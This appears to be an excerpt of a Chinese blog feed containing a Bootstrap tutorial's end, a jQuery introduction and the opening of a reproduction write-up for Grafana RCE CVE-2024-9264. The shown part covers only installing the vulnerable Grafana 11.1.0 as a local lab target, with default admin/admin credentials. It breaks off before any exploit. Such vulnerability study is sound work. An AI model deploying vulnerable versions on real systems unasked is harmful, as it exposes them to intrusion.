class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-item<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-link<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>联系<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-3-模态框"><a href="#4-3-模态框" class="headerlink" title="4.3 模态框"></a>4.3 模态框</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 触发按钮 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#exampleModal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    打开模态框<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 模态框 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal fade<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>exampleModal<span class="token punctuation">"</span></span> <span class="token attr-name">tabindex</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-dialog<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-header<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-title<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>模态框标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn-close<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-dismiss</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-body<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                这是模态框的内容。            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-footer<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-secondary<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-dismiss</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>关闭<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>保存更改<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、优点与不足"><a href="#五、优点与不足" class="headerlink" title="五、优点与不足"></a>五、优点与不足</h1><h2 id="5-1-优点"><a href="#5-1-优点" class="headerlink" title="5.1 优点"></a>5.1 <strong>优点</strong></h2><ul><li>快速开发：减少 CSS 和 JavaScript 的重复工作。</li><li>高质量：提供一致的视觉和功能体验。</li><li>大量社区支持和插件。</li></ul><h2 id="5-2-不足"><a href="#5-2-不足" class="headerlink" title="5.2 不足"></a>5.2 <strong>不足</strong></h2><ul><li>样式可能显得过于通用，缺乏个性化。</li><li>对小型项目可能显得繁重。</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Bootstrap 是前端开发的强大工具，特别适用于需要快速开发、响应式设计和一致性体验的项目。尽管现代前端框架（如 React 和 Vue）提供了更多交互功能，但 Bootstrap 在传统网站开发中仍具有重要地位。</p>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bootstrap </tag>
            
            <tag> 前端开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jQuery</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/jquery/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/jquery/</url>
      
        <content type="html"><![CDATA[<h1 id="一、jQuery简介"><a href="#一、jQuery简介" class="headerlink" title="一、jQuery简介"></a>一、jQuery简介</h1><p>jQuery 是一个快速、简洁、跨平台的 JavaScript 库，专为简化 HTML 文档操作、事件处理、动画制作以及与服务器端的交互（Ajax）而设计。它由 John Resig 于 2006 年创建，现已成为前端开发中最广泛使用的工具之一。</p><p>虽然 jQuery 曾在前端开发中占据主导地位，但随着现代框架（如 React、Vue、Angular）的崛起，它的使用有所减少。然而，由于其简单性和广泛支持，jQuery 在许多项目中仍然有一席之地，尤其是在需要快速开发或维护旧项目时。</p><h1 id="二、-jQuery-核心特点"><a href="#二、-jQuery-核心特点" class="headerlink" title="二、 jQuery 核心特点"></a>二、 jQuery 核心特点</h1><h3 id="1-跨浏览器兼容性"><a href="#1-跨浏览器兼容性" class="headerlink" title="1. 跨浏览器兼容性"></a>1. <strong>跨浏览器兼容性</strong></h3><p>jQuery 解决了不同浏览器对 JavaScript 的实现差异，提供统一的接口，使开发者能更轻松地编写跨浏览器的代码。</p><h3 id="2-简化-DOM-操作"><a href="#2-简化-DOM-操作" class="headerlink" title="2. 简化 DOM 操作"></a>2. <strong>简化 DOM 操作</strong></h3><p>通过 jQuery，开发者可以用简单、直观的语法轻松地选择、操作 HTML 元素。例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 使用 jQuery 修改元素内容</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myElement"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"新的内容"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-事件处理"><a href="#3-事件处理" class="headerlink" title="3. 事件处理"></a>3. <strong>事件处理</strong></h3><p>jQuery 提供了简便的事件绑定和解绑方法，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 为按钮绑定点击事件</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myButton"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"按钮被点击！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-动画与效果"><a href="#4-动画与效果" class="headerlink" title="4. 动画与效果"></a>4. <strong>动画与效果</strong></h3><p>jQuery 内置多种动画效果，可以快速实现页面动态效果：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 淡入元素</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myElement"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fadeIn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="5-Ajax-支持"><a href="#5-Ajax-支持" class="headerlink" title="5. Ajax 支持"></a>5. <strong>Ajax 支持</strong></h3><p>jQuery 提供了方便的 Ajax 方法，可以轻松与服务器交互：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 通过 jQuery 发起 GET 请求</span>$<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"example.com/api"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-丰富的插件生态"><a href="#6-丰富的插件生态" class="headerlink" title="6. 丰富的插件生态"></a>6. <strong>丰富的插件生态</strong></h3><p>jQuery 拥有大量第三方插件，可以扩展其功能，满足特定需求。</p><h3 id="7-链式调用"><a href="#7-链式调用" class="headerlink" title="7. 链式调用"></a>7. <strong>链式调用</strong></h3><p>jQuery 的链式调用特性允许在一条语句中连续调用多个方法，从而使代码更加简洁：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myElement"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">"highlight"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fadeIn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"更新内容"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-轻量级"><a href="#8-轻量级" class="headerlink" title="8. 轻量级"></a>8. <strong>轻量级</strong></h3><p>尽管功能强大，jQuery 的核心库大小较小，加载速度快。</p><h1 id="三、示例"><a href="#三、示例" class="headerlink" title="三、示例"></a>三、示例</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"&lt;url id="</span><span class="token string">" type="</span>url<span class="token string">" status="</span><span class="token string">" title="</span><span class="token string">" wc="</span><span class="token string">"&gt;https://code.jquery.com/jquery-3.6.0.min.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>url<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>        <span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#toggleButton"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toggle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>button id<span class="token operator">=</span><span class="token string">"toggleButton"</span><span class="token operator">&gt;</span>切换显示<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>p id<span class="token operator">=</span><span class="token string">"message"</span><span class="token operator">&gt;</span>这是一个可切换的段落。<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这是一个完整且简单的 jQuery 示例代码。它展示了如何使用 jQuery 实现事件处理和元素的显示/隐藏效果。</p><h3 id="功能说明"><a href="#功能说明" class="headerlink" title="功能说明"></a>功能说明</h3><ol><li><strong>加载 jQuery</strong><br>在 <code>&lt;head&gt;</code> 部分通过 <code>&lt;script&gt;</code> 标签加载了 jQuery 的官方库（版本 3.6.0）。</li><li><strong>DOM 准备就绪处理</strong><br>使用 <code>$(document).ready()</code> 确保在 DOM 加载完成后再执行代码。</li><li><strong>按钮点击事件</strong><br>当用户点击按钮（ID 为 <code>toggleButton</code>）时，会触发绑定的事件处理器。</li><li><strong>切换显示/隐藏</strong><br><code>$("#message").toggle();</code> 方法会在每次点击按钮时切换段落（ID 为 <code>message</code>）的显示状态。</li></ol><h3 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h3><p>初始状态下，页面上显示一个按钮和一段文字。</p><p>点击按钮后，文字会消失。</p><p>再次点击按钮，文字重新出现。</p><h3 id="扩展功能"><a href="#扩展功能" class="headerlink" title="扩展功能"></a>扩展功能</h3><p>如果你想增加一些效果，比如使用动画，可以替换 <code>toggle</code> 为 <code>fadeToggle</code> 或 <code>slideToggle</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fadeToggle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 使用淡入淡出效果切换</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端开发 </tag>
            
            <tag> jQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Grafana表达式远程代码执行(CVE-2024-9264)</title>
      <link href="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/"/>
      <url>/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Grafana基础"><a href="#一、Grafana基础" class="headerlink" title="一、Grafana基础"></a>一、Grafana基础</h1><h2 id="1-1-Grafana是什么？"><a href="#1-1-Grafana是什么？" class="headerlink" title="1.1 Grafana是什么？"></a>1.1 Grafana是什么？</h2><p>Grafana是一款开源的数据可视化和监控平台，它允许用户通过创建动态仪表板来监视和分析数据。</p><p>以下是Grafana的一些主要特点和功能：</p><ol><li><strong>多数据源支持</strong>：Grafana支持多种数据源，包括但不限于Graphite、Prometheus、Elasticsearch、InfluxDB等，可以从多种数据源中收集数据，并在同一仪表板中进行统一展示。</li><li><strong>丰富的可视化选项</strong>：提供了各种图表类型、样式和配置选项，用户可以根据需求定制图表。</li><li><strong>告警功能</strong>：支持设置警报规则，并在达到特定条件时发送通知。</li><li><strong>插件生态系统</strong>：拥有丰富的插件生态系统，用户可以根据需要扩展和定制功能。</li><li><strong>社区支持</strong>：拥有活跃的开发社区，提供了丰富的文档、教程和支持资源。</li><li><strong>跨平台性</strong>：Grafana是一个跨平台的开源的分析和可视化工具，可以通过将采集的数据查询然后可视化的展示，并及时通知。</li><li><strong>图表与可视化</strong>：Grafana具有快速灵活的客户端图表，面板插件有许多不同方式的可视化指标和日志，官方库中具有丰富的仪表盘插件，比如热图、折线图、图表等多种展示方式，让复杂的数据展示的美观而优雅。</li><li><strong>实际应用场景广泛</strong>：Grafana广泛应用于IT基础设施监控、业务数据分析与可视化、实时数据仪表板构建等领域。</li><li><strong>版本更新</strong>：Grafana 10.0版本在2023年6月发布，带来了许多新功能和改进，如更新的Panel面板、Dashboard、导航栏以及Grafana Altering等。</li></ol><p>Grafana以其强大的功能和灵活性，成为了数据可视化和监控领域的重要工具，适用于各种规模的项目和不同的监控需求。</p><h2 id="1-2-安装部署"><a href="#1-2-安装部署" class="headerlink" title="1.2 安装部署"></a>1.2 安装部署</h2><p>在Ubuntu上安装指定版本的Grafana，你可以按照以下步骤操作：</p><p>这里我所使用的ubuntu系统信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ubuntu <span class="token number">22.04</span>.3 LTS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2014.00.27.png" alt="系统信息" style="zoom:40%;"><h3 id="1-2-1-更新系统软件包"><a href="#1-2-1-更新系统软件包" class="headerlink" title="1.2.1 更新系统软件包"></a>1.2.1 <strong>更新系统软件包</strong></h3><p>更新你的Ubuntu系统以确保所有软件包和依赖项是最新的。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">sudo apt updatesudo apt upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>命令详解：</p><p><code>sudo apt update</code> 和 <code>sudo apt upgrade</code> 是在基于 Debian 的 Linux 发行版（如 Ubuntu）中使用的命令，它们用于管理和更新系统软件包。下面是这两个命令的详细解释：</p><h3 id="sudo-apt-update"><a href="#sudo-apt-update" class="headerlink" title="sudo apt update"></a>sudo apt update</h3><ul><li><code>sudo</code>：这是一个命令行实用程序，允许授权的用户以另一个用户的安全权限执行命令，默认情况下是以超级用户（root）的权限执行。</li><li><code>apt</code>：是“Advanced Package Tool”的缩写，它是 Debian 及其衍生版（如 Ubuntu）的软件包管理工具。</li><li><code>update</code>：这是 <code>apt</code> 工具的一个命令，用于从源服务器同步软件包索引文件。这个命令不会更改任何已安装的软件包，它只是更新本地数据库，使其与软件源中的最新软件包信息保持一致。</li></ul><p>执行 <code>sudo apt update</code> 时，系统会从每个启用的软件源（在 <code>/etc/apt/sources.list</code> 和 <code>/etc/apt/sources.list.d/</code> 下的文件中定义）获取最新的软件包列表。这个操作是安装、升级或移除软件包之前的重要步骤，因为它确保了你拥有最新的软件包信息。</p><h3 id="sudo-apt-upgrade"><a href="#sudo-apt-upgrade" class="headerlink" title="sudo apt upgrade"></a>sudo apt upgrade</h3><ul><li><code>upgrade</code>：这是 <code>apt</code> 的另一个命令，用于升级所有可升级的软件包至最新版本。</li></ul><p>执行 <code>sudo apt upgrade</code> 时，系统会查找所有已安装的软件包，如果有可用的更新（这些信息是通过 <code>sudo apt update</code> 获得的），则将它们升级到最新版本。这个命令会处理依赖关系，确保在升级过程中所需的依赖项也会被安装或升级。</p></blockquote><h3 id="1-2-2-访问官网"><a href="#1-2-2-访问官网" class="headerlink" title="1.2.2 访问官网"></a>1.2.2 访问官网</h3><p><a href="https://grafana.com/grafana/download/11.1.0?pg=get&amp;plcmt=selfmanaged-box1-cta1">https://grafana.com/grafana/download/11.1.0?pg=get&amp;plcmt=selfmanaged-box1-cta1</a></p> <img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.30.28.png" alt="grafana官网" style="zoom:50%;"><p>【选择特定的版本，CVE-2024-9264被评为9.9的CVSS评分，影响Grafana 11.0.x、11.1.x和11.2.x版本。】</p><p>后续按照官方提示操作即可。</p><h3 id="1-2-3-安装grafana"><a href="#1-2-3-安装grafana" class="headerlink" title="1.2.3 安装grafana"></a>1.2.3 安装grafana</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> adduser libfontconfig1 musl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li>bug处理</li></ul><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.34.52.png" alt="bug" style="zoom:50%;"><p>错误解释：</p><ul><li><code>E: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 27625 (unattended-upgr)</code>：这个错误表明 <code>apt-get</code> 无法获取 <code>/var/lib/dpkg/lock-frontend</code> 这个锁文件，因为它正被进程号为 27625 的进程（<code>unattended-upgr</code>，即无人值守升级进程）占用。</li><li><code>N: Be aware that removing the lock file is not a solution and may break your system.</code>：这是一个警告，提醒用户不要简单地删除锁文件，因为这可能会破坏系统。</li><li><code>E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?</code>：这个错误再次强调无法获取 dpkg 前端锁，询问是否有其他进程正在使用它。</li></ul><p>这个错误通常发生在系统正在进行另一个软件包管理操作，比如另一个 <code>apt-get</code> 命令或者系统更新正在运行。解决这个问题的方法通常是等待当前的软件包管理操作完成，或者如果确定没有其他操作在进行，可以检查是否有僵尸进程占用了锁文件。</p><p>如果需要强制终止占用锁文件的进程，可以使用以下命令（请谨慎使用，因为这可能会导致系统不稳定）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token number">27625</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再次尝试运行你的 <code>apt-get</code> 命令。如果你不确定，最好先检查系统是否有正在运行的更新或软件包管理操作。</p></blockquote><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.38.52-3722748.png" alt="依赖安装" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dl.grafana.com/enterprise/release/grafana-enterprise_11.1.0_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.47.36.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> grafana-enterprise_11.1.0_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>dpkg</code>：是 Debian 包管理器的命令行工具，用于安装、构建、拆除和检查 Debian 软件包。</li><li><code>-i</code>：这是 <code>dpkg</code> 命令的一个选项，代表 <code>--install</code>，用于安装本地的 Debian 软件包。</li></ul></blockquote><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.51.52.png" alt="截屏2024-12-09 13.51.52" style="zoom:50%;"><h3 id="1-2-4-启动服务"><a href="#1-2-4-启动服务" class="headerlink" title="1.2.4 启动服务"></a>1.2.4 启动服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /bin/systemctl start grafana-server或systemctl start grafana-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="1-2-5-查看启动状态"><a href="#1-2-5-查看启动状态" class="headerlink" title="1.2.5 查看启动状态"></a>1.2.5 查看启动状态</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /bin/systemctl status grafana-server或systemctl status grafana-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.55.03.png" alt="截屏2024-12-09 13.55.03" style="zoom:50%;"><h3 id="1-2-6-访问服务"><a href="#1-2-6-访问服务" class="headerlink" title="1.2.6 访问服务"></a>1.2.6 访问服务</h3><p>浏览器输入IP:3000进行登录<br>        默认用户密码：admin/admin</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-09%2013.57.27.png" alt="本机测试" style="zoom:40%;"><p>【本机测试】</p><img 